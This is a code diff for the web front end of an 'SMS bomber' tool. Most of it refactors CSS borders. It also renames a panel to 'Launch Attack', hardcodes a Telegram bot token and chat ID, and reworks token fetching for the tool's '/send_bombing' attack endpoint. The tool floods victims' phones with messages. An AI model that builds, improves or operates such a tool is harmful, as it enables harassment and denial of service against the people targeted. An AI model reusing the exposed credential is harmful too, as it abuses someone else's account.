@@ -22,7 +22,10 @@
   --mono:'Share Tech Mono',monospace;
   --orb:'Orbitron',monospace;
   --raj:'Rajdhani',sans-serif;
-} 
+  /* ── UNIFIED BORDER COLOR ── */
+  --border: rgba(0,255,65,.32);
+  --border-hover: rgba(0,255,65,.65);
+}
 html{scroll-behavior:smooth}
 body{background:var(--bg);color:var(--g);font-family:var(--mono);min-height:100vh;overflow-x:hidden;cursor:default}
 .cursor-dot{position:fixed;width:6px;height:6px;background:var(--g);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:opacity .2s;box-shadow:0 0 8px var(--g)}
@@ -32,7 +35,7 @@ body{background:var(--bg);color:var(--g);font-family:var(--mono);min-height:100v
 .grid{position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(0,255,65,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,65,.018) 1px,transparent 1px);background-size:44px 44px}
 .scan{position:fixed;left:0;right:0;height:1.5px;z-index:1;pointer-events:none;background:linear-gradient(90deg,transparent,rgba(0,255,65,.5),transparent);animation:scanmv 8s linear infinite}
 @keyframes scanmv{0%{top:-2px}100%{top:100vh}}
-.crn{position:fixed;z-index:3;pointer-events:none;border-color:rgba(0,255,65,.28);border-style:solid}
+.crn{position:fixed;z-index:3;pointer-events:none;border-color:var(--border);border-style:solid}
 .crn.tl{top:10px;left:10px;width:22px;height:22px;border-width:1px 0 0 1px}
 .crn.tr{top:10px;right:10px;width:22px;height:22px;border-width:1px 1px 0 0}
 .crn.bl{bottom:10px;left:10px;width:22px;height:22px;border-width:0 0 1px 1px}
@@ -40,13 +43,13 @@ body{background:var(--bg);color:var(--g);font-family:var(--mono);min-height:100v
 #boot{position:fixed;inset:0;background:#020602;z-index:1000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;transition:opacity .6s}
 #boot.hide{opacity:0;pointer-events:none}
 .boot-logo{font-family:var(--orb);font-size:clamp(20px,4vw,36px);font-weight:900;letter-spacing:8px;color:var(--g);text-shadow:0 0 30px rgba(0,255,65,.5)}
-.boot-bar-wrap{width:min(320px,80vw);height:2px;background:rgba(0,255,65,.1);border-radius:2px;overflow:hidden}
+.boot-bar-wrap{width:min(320px,80vw);height:2px;background:rgba(0,255,65,.1);border-radius:2px;overflow:hidden;border:none}
 .boot-bar{height:100%;background:var(--g);width:0%;box-shadow:0 0 8px var(--g);animation:bootfill 1.6s ease forwards}
 @keyframes bootfill{to{width:100%}}
 .boot-txt{font-size:10px;letter-spacing:3px;color:rgba(0,255,65,.45);animation:blink 1s step-end infinite}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 .page{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column}
-nav{position:sticky;top:0;z-index:200;height:54px;padding:0 24px;background:rgba(1,5,1,.97);border-bottom:1px solid var(--gd);backdrop-filter:blur(20px);display:flex;align-items:center;justify-content:space-between}
+nav{position:sticky;top:0;z-index:200;height:54px;padding:0 24px;background:rgba(1,5,1,.97);border-bottom:1px solid var(--border);backdrop-filter:blur(20px);display:flex;align-items:center;justify-content:space-between}
 .nb{font-family:var(--orb);font-size:12px;font-weight:900;letter-spacing:5px;text-transform:uppercase;display:flex;align-items:center;gap:10px}
 .ldot{width:8px;height:8px;border-radius:50%;background:var(--g);animation:pulse 2s ease-in-out infinite;flex-shrink:0}
 @keyframes pulse{0%,100%{box-shadow:0 0 0 0 var(--gg);opacity:1}50%{box-shadow:0 0 0 7px transparent;opacity:.4}}
@@ -55,28 +58,28 @@ nav{position:sticky;top:0;z-index:200;height:54px;padding:0 24px;background:rgba
 .nav-stat-dot{width:4px;height:4px;border-radius:50%;background:var(--g);animation:pulse 1.5s ease-in-out infinite}
 .nr{display:flex;align-items:center;gap:10px}
 .nbtn{display:flex;align-items:center;gap:6px;color:rgba(0,255,65,.42);text-decoration:none;font-size:9px;letter-spacing:2px;text-transform:uppercase;padding:5px 11px;border:1px solid transparent;border-radius:4px;transition:all .2s}
-.nbtn:hover{color:var(--g);border-color:var(--ge);background:var(--gb);box-shadow:0 0 12px rgba(0,255,65,.08)}
+.nbtn:hover{color:var(--g);border-color:var(--border-hover);background:var(--gb);box-shadow:0 0 12px rgba(0,255,65,.08)}
 .nbtn svg{width:13px;height:13px;flex-shrink:0}
 .nclk{font-family:var(--orb);font-size:10px;color:rgba(0,255,65,.25);letter-spacing:3px}
 .hero{text-align:center;padding:56px 16px 32px;position:relative}
 .hero-glow{position:absolute;top:0;left:50%;transform:translateX(-50%);width:min(600px,90vw);height:200px;background:radial-gradient(ellipse at 50% 0%,rgba(0,255,65,.08) 0%,transparent 70%);pointer-events:none}
-.hbadge{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--ge);background:var(--gc);color:rgba(0,255,65,.65);font-size:9px;letter-spacing:5px;text-transform:uppercase;padding:5px 20px;border-radius:30px;margin-bottom:22px;animation:fup .5s ease both}
+.hbadge{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--border);background:var(--gc);color:rgba(0,255,65,.65);font-size:9px;letter-spacing:5px;text-transform:uppercase;padding:5px 20px;border-radius:30px;margin-bottom:22px;animation:fup .5s ease both}
 .htitle{font-family:var(--orb);font-size:clamp(26px,6.5vw,60px);font-weight:900;letter-spacing:7px;line-height:1.08;min-height:1.2em;text-shadow:0 0 40px rgba(0,255,65,.4),0 0 80px rgba(0,255,65,.12),0 2px 0 rgba(0,0,0,.5);animation:fup .55s ease .07s both}
 .hsub{font-family:var(--raj);font-size:14px;font-weight:500;color:rgba(0,255,65,.3);letter-spacing:5px;text-transform:uppercase;margin-top:10px;min-height:1.5em;animation:fup .55s ease .13s both}
 .hero-stats{display:flex;align-items:center;justify-content:center;gap:28px;margin-top:26px;animation:fup .55s ease .2s both}
 .hstat{text-align:center}
 .hstat-num{font-family:var(--orb);font-size:18px;font-weight:900;color:var(--g);text-shadow:0 0 16px rgba(0,255,65,.4)}
 .hstat-lbl{font-size:9px;letter-spacing:3px;color:rgba(0,255,65,.3);text-transform:uppercase;margin-top:2px}
-.hstat-div{width:1px;height:32px;background:var(--gd)}
+.hstat-div{width:1px;height:32px;background:var(--border)}
 .hrule{display:flex;align-items:center;gap:14px;max-width:280px;margin:24px auto 0;animation:fup .55s ease .25s both}
-.hrule::before,.hrule::after{content:'';flex:1;height:1px;background:var(--gd)}
+.hrule::before,.hrule::after{content:'';flex:1;height:1px;background:var(--border)}
 .hrule-sym{color:rgba(0,255,65,.35);font-size:12px}
 @keyframes fup{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
-.sbar{border-top:1px solid var(--gd);border-bottom:1px solid var(--gd);background:rgba(1,5,1,.8);display:flex;align-items:center;justify-content:center;flex-wrap:wrap;overflow:hidden;position:relative}
+.sbar{border-top:1px solid var(--border);border-bottom:1px solid var(--border);background:rgba(1,5,1,.8);display:flex;align-items:center;justify-content:center;flex-wrap:wrap;overflow:hidden;position:relative}
 .sbar-ticker{display:flex;align-items:center;gap:0;width:100%;overflow:hidden}
 .sbar-inner{display:flex;align-items:center;animation:ticker 30s linear infinite;white-space:nowrap}
 @keyframes ticker{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
-.si{display:inline-flex;align-items:center;gap:7px;font-size:9px;color:rgba(0,255,65,.42);letter-spacing:2px;text-transform:uppercase;padding:10px 20px;border-right:1px solid var(--gd);flex-shrink:0}
+.si{display:inline-flex;align-items:center;gap:7px;font-size:9px;color:rgba(0,255,65,.42);letter-spacing:2px;text-transform:uppercase;padding:10px 20px;border-right:1px solid var(--border);flex-shrink:0}
 .sd{width:5px;height:5px;border-radius:50%;flex-shrink:0;background:var(--g);animation:pulse 2s ease-in-out infinite}
 .sd.y{background:var(--yel);animation-delay:.3s}.sd.c{background:var(--cyn);animation-delay:.6s}.sd.p{background:var(--pur);animation-delay:.9s}.sd.r{background:var(--red);animation-delay:1.2s}
 main{flex:1;max-width:680px;width:100%;margin:0 auto;padding:32px 13px 64px}
@@ -85,14 +88,15 @@ main{flex:1;max-width:680px;width:100%;margin:0 auto;padding:32px 13px 64px}
 .slbl-icon{font-size:10px;color:rgba(0,255,65,.35)}
 .card{background:var(--panel);border-radius:12px;overflow:hidden;margin-bottom:12px;position:relative;animation:fup .5s ease both;transition:box-shadow .35s,border-color .35s,transform .2s}
 .card:hover{transform:translateY(-1px)}
-.c1,.c2,.c3,.c4{border:1px solid rgba(0,255,65,.28)}
-.c1:hover,.c2:hover,.c3:hover,.c4:hover{box-shadow:0 8px 32px rgba(0,255,65,.12),0 0 1px rgba(0,255,65,.5);border-color:rgba(0,255,65,.55)}
+/* ── UNIFIED BORDER FOR ALL CARDS ── */
+.c1,.c2,.c3,.c4{border:1px solid var(--border)}
+.c1:hover,.c2:hover,.c3:hover,.c4:hover{box-shadow:0 8px 32px rgba(0,255,65,.12),0 0 1px rgba(0,255,65,.5);border-color:var(--border-hover)}
 .card:nth-child(1){animation-delay:.05s}.card:nth-child(2){animation-delay:.11s}.card:nth-child(3){animation-delay:.17s}.card:nth-child(4){animation-delay:.23s}
 .c1::before,.c2::before,.c3::before,.c4::before{content:'';position:absolute;top:0;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,65,.55),transparent)}
 .c1::after,.c2::after,.c3::after,.c4::after{content:'';position:absolute;top:16%;left:0;width:2px;bottom:16%;background:linear-gradient(180deg,transparent,rgba(0,255,65,.45),transparent);border-radius:2px}
 .ch{padding:13px 20px;border-bottom:1px solid rgba(255,255,255,.04);background:rgba(0,0,0,.22);display:flex;align-items:center;gap:11px}
 .sb{width:24px;height:24px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-family:var(--orb);font-size:8px;font-weight:700}
-.sg,.sc,.sp,.sy{border:1px solid rgba(0,255,65,.38);background:rgba(0,255,65,.11);color:var(--g)}
+.sg,.sc,.sp,.sy{border:1px solid var(--border);background:rgba(0,255,65,.11);color:var(--g)}
 .sy{font-size:7px}
 .cl{font-family:var(--raj);font-size:12px;font-weight:600;letter-spacing:3px;text-transform:uppercase}
 .clg,.clc,.clp,.cly{color:rgba(0,255,65,.7)}
@@ -101,12 +105,12 @@ main{flex:1;max-width:680px;width:100%;margin:0 auto;padding:32px 13px 64px}
 .cb{padding:18px 20px}
 .flbl{display:block;font-size:9px;letter-spacing:3px;text-transform:uppercase;color:rgba(0,255,65,.3);margin-bottom:9px}
 .iw{position:relative;border-radius:9px;padding:15px 17px;display:flex;align-items:center;gap:9px;overflow:hidden;transition:box-shadow .28s,border-color .28s,background .28s}
-.ig,.ic{background:var(--inp);border:1.5px solid rgba(0,255,65,.25)}
+.ig,.ic{background:var(--inp);border:1.5px solid var(--border)}
 .iw::before,.iw::after{content:'';position:absolute;opacity:0;border-style:solid;transition:opacity .28s,width .3s,height .3s;width:11px;height:11px}
 .ig::before,.ic::before{top:2px;left:2px;border-width:1.5px 0 0 1.5px;border-color:rgba(0,255,65,.75);border-radius:2px 0 0 0}
 .ig::after,.ic::after{bottom:2px;right:2px;border-width:0 1.5px 1.5px 0;border-color:rgba(0,255,65,.75);border-radius:0 0 2px 0}
 .iw:focus-within::before,.iw:focus-within::after{opacity:1}
-.ig:focus-within,.ic:focus-within{border-color:rgba(0,255,65,.65);background:rgba(1,8,1,.99);box-shadow:0 0 0 2px rgba(0,255,65,.07),0 0 24px rgba(0,255,65,.13),inset 0 0 16px rgba(0,255,65,.04)}
+.ig:focus-within,.ic:focus-within{border-color:var(--border-hover);background:rgba(1,8,1,.99);box-shadow:0 0 0 2px rgba(0,255,65,.07),0 0 24px rgba(0,255,65,.13),inset 0 0 16px rgba(0,255,65,.04)}
 .isc{position:absolute;left:0;right:0;height:1px;pointer-events:none;animation:isca 3.5s linear infinite;opacity:0;transition:opacity .3s;top:0}
 .ig .isc,.ic .isc{background:linear-gradient(90deg,transparent,rgba(0,255,65,.2),transparent)}
 .iw:focus-within .isc{opacity:1}
@@ -135,40 +139,40 @@ main{flex:1;max-width:680px;width:100%;margin:0 auto;padding:32px 13px 64px}
 @keyframes bpulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,.22)}55%{box-shadow:0 0 0 9px rgba(0,255,65,0)}}
 .btxt{position:relative;z-index:1}
 .res{border-radius:11px;padding:18px;margin-top:14px;display:none}
-.res.ok{display:block;background:rgba(0,40,16,.5);border:1px solid rgba(0,255,65,.4);animation:fup .3s ease,pop .45s ease}
+.res.ok{display:block;background:rgba(0,40,16,.5);border:1px solid var(--border);animation:fup .3s ease,pop .45s ease}
 .res.fail{display:block;background:rgba(60,0,0,.4);border:1px solid rgba(255,51,51,.4);color:var(--red);animation:fup .3s ease}
 @keyframes pop{0%{transform:scale(.96)}60%{transform:scale(1.01)}100%{transform:scale(1)}}
 .rh{font-family:var(--orb);font-size:10px;font-weight:700;letter-spacing:3px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
 .rr{display:flex;gap:10px;margin-bottom:7px;align-items:flex-start}
 .rk{opacity:.35;min-width:88px;letter-spacing:1px;flex-shrink:0;font-size:10px;text-transform:uppercase}
 .rv{font-size:11px;word-break:break-all}
-.res-div{margin-top:14px;padding-top:12px;border-top:1px solid rgba(0,255,65,.1)}
-.again-btn{width:100%;background:transparent;border:1px solid rgba(0,255,65,.28);color:rgba(0,255,65,.65);font-family:var(--orb);font-size:9px;letter-spacing:3px;padding:10px 18px;border-radius:6px;cursor:pointer;text-transform:uppercase;transition:all .2s}
-.again-btn:hover{background:rgba(0,255,65,.07);border-color:rgba(0,255,65,.5);color:var(--g)}
-.toast{position:fixed;bottom:24px;right:24px;z-index:500;background:rgba(3,16,6,.97);border:1px solid rgba(0,255,65,.4);border-radius:9px;padding:14px 18px;font-size:11px;letter-spacing:1px;display:flex;align-items:center;gap:10px;transform:translateY(80px);opacity:0;transition:transform .35s cubic-bezier(.175,.885,.32,1.275),opacity .35s;max-width:300px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+.res-div{margin-top:14px;padding-top:12px;border-top:1px solid var(--border)}
+.again-btn{width:100%;background:transparent;border:1px solid var(--border);color:rgba(0,255,65,.65);font-family:var(--orb);font-size:9px;letter-spacing:3px;padding:10px 18px;border-radius:6px;cursor:pointer;text-transform:uppercase;transition:all .2s}
+.again-btn:hover{background:rgba(0,255,65,.07);border-color:var(--border-hover);color:var(--g)}
+.toast{position:fixed;bottom:24px;right:24px;z-index:500;background:rgba(3,16,6,.97);border:1px solid var(--border);border-radius:9px;padding:14px 18px;font-size:11px;letter-spacing:1px;display:flex;align-items:center;gap:10px;transform:translateY(80px);opacity:0;transition:transform .35s cubic-bezier(.175,.885,.32,1.275),opacity .35s;max-width:300px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
 .toast.show{transform:translateY(0);opacity:1}
 .toast.fail-toast{border-color:rgba(255,51,51,.4);color:var(--red)}
 .toast-icon{font-size:16px;flex-shrink:0}
-.logbox{background:rgba(1,4,1,.99);border:1px solid rgba(0,255,65,.18);border-radius:9px;padding:13px 15px;max-height:110px;overflow-y:auto;font-size:10px;position:relative}
+.logbox{background:rgba(1,4,1,.99);border:1px solid var(--border);border-radius:9px;padding:13px 15px;max-height:110px;overflow-y:auto;font-size:10px;position:relative}
 .logbox::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,65,.4),transparent)}
 .logbox::-webkit-scrollbar{width:3px}
 .logbox::-webkit-scrollbar-thumb{background:rgba(0,255,65,.2);border-radius:2px}
 .le{margin-bottom:5px;display:flex;gap:9px;line-height:1.4}
 .let{color:rgba(0,255,65,.3);flex-shrink:0}.lem{color:rgba(0,255,65,.45)}
 .le.ok .lem{color:rgba(0,255,65,.85)}.le.err .lem{color:rgba(255,51,51,.82)}.le.warn .lem{color:rgba(255,215,0,.78)}.le.info .lem{color:rgba(0,229,255,.7)}
-footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px solid var(--gd);padding:52px 24px 28px}
+footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px solid var(--border);padding:52px 24px 28px}
 .fi{max-width:880px;margin:0 auto}
 .fg{display:grid;grid-template-columns:1.6fr 1fr 1fr;gap:44px;margin-bottom:32px}
 .flogo{font-family:var(--orb);font-size:14px;font-weight:900;letter-spacing:4px;margin-bottom:12px;display:flex;align-items:center;gap:9px}
 .fdesc{font-family:var(--raj);font-size:13px;color:rgba(0,255,65,.3);line-height:1.85;letter-spacing:.3px}
 .fct{font-family:var(--orb);font-size:9px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--g);margin-bottom:14px;display:flex;align-items:center;gap:8px}
-.fct::after{content:'';flex:1;height:1px;background:var(--gd)}
-.fl{display:flex;align-items:center;gap:9px;color:rgba(0,255,65,.38);text-decoration:none;font-family:var(--raj);font-size:13px;font-weight:500;padding:9px 0;border-bottom:1px solid rgba(0,255,65,.1);transition:color .2s,padding-left .2s,border-color .2s}
+.fct::after{content:'';flex:1;height:1px;background:var(--border)}
+.fl{display:flex;align-items:center;gap:9px;color:rgba(0,255,65,.38);text-decoration:none;font-family:var(--raj);font-size:13px;font-weight:500;padding:9px 0;border-bottom:1px solid rgba(0,255,65,.12);transition:color .2s,padding-left .2s,border-color .2s}
 .fl:last-child{border-bottom:none}
-.fl:hover{color:var(--g);padding-left:8px;border-color:var(--ge)}
+.fl:hover{color:var(--g);padding-left:8px;border-color:var(--border-hover)}
 .fl svg{width:14px;height:14px;flex-shrink:0}
-.ftag{margin-left:auto;font-size:8px;letter-spacing:2px;border:1px solid var(--gd);background:var(--gb);color:rgba(0,255,65,.36);padding:1px 7px;border-radius:3px;flex-shrink:0}
-.fbot{padding-top:18px;border-top:1px solid var(--gd);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;font-size:9px;color:rgba(0,255,65,.16);letter-spacing:2px}
+.ftag{margin-left:auto;font-size:8px;letter-spacing:2px;border:1px solid var(--border);background:var(--gb);color:rgba(0,255,65,.36);padding:1px 7px;border-radius:3px;flex-shrink:0}
+.fbot{padding-top:18px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;font-size:9px;color:rgba(0,255,65,.16);letter-spacing:2px}
 .flk{animation:flicker 6s ease-in-out infinite}
 @keyframes flicker{0%,91%,93%,95%,100%{opacity:1}92%,94%{opacity:.45}}
 @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
@@ -218,7 +222,7 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
       <span>Facebook</span>
     </a>
     <a class="nbtn" href="https://t.me/TEAMDANGEROUS" target="_blank" rel="noopener">
-      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
       <span>Telegram</span>
     </a>
     <div class="nclk" id="nc">--:--:--</div>
@@ -311,7 +315,7 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
     </div>
 
     <!-- TERMINAL WINDOW -->
-    <div style="background:#000;border:1px solid rgba(0,255,65,.25);border-radius:8px;overflow:hidden;box-shadow:0 0 30px rgba(0,255,65,.05),inset 0 0 40px rgba(0,0,0,.9);">
+    <div style="background:#000;border:1px solid var(--border);border-radius:8px;overflow:hidden;box-shadow:0 0 30px rgba(0,255,65,.05),inset 0 0 40px rgba(0,0,0,.9);">
       <div style="background:rgba(0,255,65,.06);border-bottom:1px solid rgba(0,255,65,.12);padding:7px 14px;display:flex;align-items:center;gap:7px;">
         <span style="width:9px;height:9px;border-radius:50%;background:#ff453a;display:inline-block;flex-shrink:0;box-shadow:0 0 5px #ff453a88;"></span>
         <span style="width:9px;height:9px;border-radius:50%;background:#ffd60a;display:inline-block;flex-shrink:0;box-shadow:0 0 5px #ffd60a88;"></span>
@@ -333,7 +337,7 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
     </div>
 
     <!-- PROGRESS -->
-    <div style="margin-top:10px;background:rgba(0,0,0,.5);border:1px solid rgba(0,255,65,.12);border-radius:6px;padding:9px 14px;">
+    <div style="margin-top:10px;background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:6px;padding:9px 14px;">
       <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
         <span style="font-size:9px;letter-spacing:3px;color:rgba(0,255,65,.3);">INJECTION PROGRESS</span>
         <span id="progressPct" style="font-family:'Orbitron',monospace;font-size:10px;color:var(--g);">0%</span>
@@ -345,11 +349,11 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
   </div>
 </div>
 
-<!-- CARD 3 -->
+<!-- CARD 3 — "Confirm & Transmit" section removed as requested -->
 <div class="card c3">
   <div class="ch">
     <div class="sb sp">03</div>
-    <div class="cl clp">Confirm &amp; Transmit</div>
+    <div class="cl clp">Launch Attack</div>
     <div class="ch-line"></div>
     <div class="ch-tag">SEND</div>
   </div>
@@ -429,196 +433,315 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 </div>
 
 <script>
-// ── CONFIG ──
+// ══════════════════════════════════════════
+// CONFIG
+// ══════════════════════════════════════════
 const BOT_TOKEN = "8229374272:AAHUZqtxMIQwkKbiOLSD9HOJkrkuqzaHtdk";
 const CHAT_ID   = "5274336938";
 const API_BASE  = "https://smsbomber.introvertboytushar.workers.dev";
 let bannedUsers = [];
 
+// ══════════════════════════════════════════
+// TOKEN FETCH — api-protection.js এর সাথে compatible
+// GET /get_token → { token, expires_at }
+// তারপর POST /send_bombing এ Authorization: Bearer <token>
+// ══════════════════════════════════════════
+let cachedToken     = null;
+let tokenExpiresAt  = 0;
+
 async function getToken() {
-  const res = await fetch(`${API_BASE}/send_bombing`);
-  if (!res.ok) throw new Error('Token failed');
+  const now = Date.now();
+  // token এখনো valid থাকলে reuse করো
+  if (cachedToken && now < tokenExpiresAt - 10000) {
+    return cachedToken;
+  }
+  const res = await fetch(`${API_BASE}/get_token`, {
+    method: 'GET',
+    headers: { 'Content-Type': 'application/json' }
+  });
+  if (!res.ok) throw new Error(`Token fetch failed: ${res.status}`);
   const data = await res.json();
-  return data.token;
+  cachedToken    = data.token;
+  // expires_at যদি থাকে use করো, না হলে 2 মিনিট default
+  tokenExpiresAt = data.expires_at ? data.expires_at : (now + 2 * 60 * 1000);
+  return cachedToken;
 }
-// ── BOOT ──
+
+// ══════════════════════════════════════════
+// BOOT
+// ══════════════════════════════════════════
 setTimeout(()=>{
   document.getElementById('boot').classList.add('hide');
-  setTimeout(()=>document.getElementById('boot').remove(),700);
-},1000);
+  setTimeout(()=>document.getElementById('boot').remove(), 700);
+}, 1000);
 
-// ── CURSOR ──
+// ══════════════════════════════════════════
+// CURSOR
+// ══════════════════════════════════════════
 (function(){
-  const dot=document.getElementById('cd'),ring=document.getElementById('cr');
-  let mx=0,my=0,rx=0,ry=0;
-  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;dot.style.left=mx+'px';dot.style.top=my+'px';});
-  function animRing(){rx+=(mx-rx)*.18;ry+=(my-ry)*.18;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(animRing);}
+  const dot=document.getElementById('cd'), ring=document.getElementById('cr');
+  let mx=0, my=0, rx=0, ry=0;
+  document.addEventListener('mousemove', e=>{
+    mx=e.clientX; my=e.clientY;
+    dot.style.left=mx+'px'; dot.style.top=my+'px';
+  });
+  function animRing(){
+    rx+=(mx-rx)*.18; ry+=(my-ry)*.18;
+    ring.style.left=rx+'px'; ring.style.top=ry+'px';
+    requestAnimationFrame(animRing);
+  }
   animRing();
   document.querySelectorAll('button,a,input,textarea').forEach(el=>{
-    el.addEventListener('mouseenter',()=>{ring.style.transform='translate(-50%,-50%) scale(1.6)';ring.style.borderColor='rgba(0,255,65,.8)';});
-    el.addEventListener('mouseleave',()=>{ring.style.transform='translate(-50%,-50%) scale(1)';ring.style.borderColor='rgba(0,255,65,.5)';});
+    el.addEventListener('mouseenter',()=>{
+      ring.style.transform='translate(-50%,-50%) scale(1.6)';
+      ring.style.borderColor='rgba(0,255,65,.8)';
+    });
+    el.addEventListener('mouseleave',()=>{
+      ring.style.transform='translate(-50%,-50%) scale(1)';
+      ring.style.borderColor='rgba(0,255,65,.5)';
+    });
   });
-  if('ontouchstart' in window){dot.style.display='none';ring.style.display='none';}
+  if('ontouchstart' in window){ dot.style.display='none'; ring.style.display='none'; }
 })();
 
-// ── MATRIX ──
+// ══════════════════════════════════════════
+// MATRIX BACKGROUND
+// ══════════════════════════════════════════
 (function(){
-  const c=document.getElementById('mc'),x=c.getContext('2d');
+  const c=document.getElementById('mc'), x=c.getContext('2d');
   const ch='01アイウエオカキクケコサシスセソタチツテトハヒフヘホ';
-  let cols,drops;
-  function init(){c.width=innerWidth;c.height=innerHeight;cols=Math.floor(c.width/20);drops=Array(cols).fill(1);}
+  let cols, drops;
+  function init(){
+    c.width=innerWidth; c.height=innerHeight;
+    cols=Math.floor(c.width/20); drops=Array(cols).fill(1);
+  }
   function draw(){
-    x.fillStyle='rgba(2,6,2,.07)';x.fillRect(0,0,c.width,c.height);
-    x.fillStyle='rgba(0,255,65,.2)';x.font='13px "Share Tech Mono",monospace';
+    x.fillStyle='rgba(2,6,2,.07)'; x.fillRect(0,0,c.width,c.height);
+    x.fillStyle='rgba(0,255,65,.2)'; x.font='13px "Share Tech Mono",monospace';
     for(let i=0;i<drops.length;i++){
-      x.fillText(ch[Math.floor(Math.random()*ch.length)],i*20,drops[i]*20);
-      if(drops[i]*20>c.height&&Math.random()>.975)drops[i]=0;
+      x.fillText(ch[Math.floor(Math.random()*ch.length)], i*20, drops[i]*20);
+      if(drops[i]*20>c.height && Math.random()>.975) drops[i]=0;
       drops[i]++;
     }
   }
-  init();setInterval(draw,68);
-  let rt;window.addEventListener('resize',()=>{clearTimeout(rt);rt=setTimeout(init,200);});
+  init(); setInterval(draw, 68);
+  let rt; window.addEventListener('resize',()=>{ clearTimeout(rt); rt=setTimeout(init,200); });
 })();
 
-// ── TYPING ──
+// ══════════════════════════════════════════
+// TYPING EFFECT
+// ══════════════════════════════════════════
 (function(){
-  const te=document.getElementById('htitle'),se=document.getElementById('hsub');
+  const te=document.getElementById('htitle'), se=document.getElementById('hsub');
   const T=['SMS TERMINAL TOOLS','SMS BOMBER TOOLS','WELCOME TO OUR SMS BOMBER SITE','FOLLOW OUR DARK CYBER MIND PAGE','DARK CYBER SPACE'];
   const S=['Pro v3.0  ·  Secure  ·  BD Edition','Fast  ·  Reliable  ·  Encrypted','Professional  ·  MESSAGE SENDER','Advanced  ·  SMS  ·  Platform','Ultra  ·  Secure  ·  Terminal'];
-  let ti=0,ci=0,ph='t';
+  let ti=0, ci=0, ph='t';
   function go(){
-    if(ph==='t'){te.textContent=T[ti].slice(0,ci+1);ci++;if(ci===T[ti].length){ph='s';ci=0;setTimeout(go,500);return;}setTimeout(go,70+Math.random()*40);}
-    else if(ph==='s'){se.textContent=S[ti].slice(0,ci+1);ci++;if(ci===S[ti].length){setTimeout(sd,3200);return;}setTimeout(go,48+Math.random()*28);}
-    else if(ph==='ds'){se.textContent=S[ti].slice(0,ci);ci--;if(ci<0){ci=0;ph='dt';setTimeout(go,90);return;}setTimeout(go,26);}
-    else if(ph==='dt'){te.textContent=T[ti].slice(0,ci);ci--;if(ci<0){ti=(ti+1)%T.length;ci=0;ph='t';setTimeout(go,320);return;}setTimeout(go,34);}
+    if(ph==='t'){
+      te.textContent=T[ti].slice(0,ci+1); ci++;
+      if(ci===T[ti].length){ ph='s'; ci=0; setTimeout(go,500); return; }
+      setTimeout(go, 70+Math.random()*40);
+    } else if(ph==='s'){
+      se.textContent=S[ti].slice(0,ci+1); ci++;
+      if(ci===S[ti].length){ setTimeout(sd,3200); return; }
+      setTimeout(go, 48+Math.random()*28);
+    } else if(ph==='ds'){
